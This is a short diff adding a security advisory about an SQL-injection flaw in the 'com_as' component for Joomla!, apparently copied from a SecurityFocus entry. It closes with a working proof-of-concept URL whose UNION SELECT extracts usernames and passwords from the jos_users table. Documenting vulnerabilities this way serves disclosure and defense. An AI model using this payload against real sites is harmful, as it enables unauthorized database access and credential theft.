@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/38757/info
+
+The 'com_as' component for Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+http://www.example.com/index.php?option=com_as&as=100&catid=-20 UNION SELECT 1,2,3,concat(username,0x3a,password)...+from+jos_users-- 
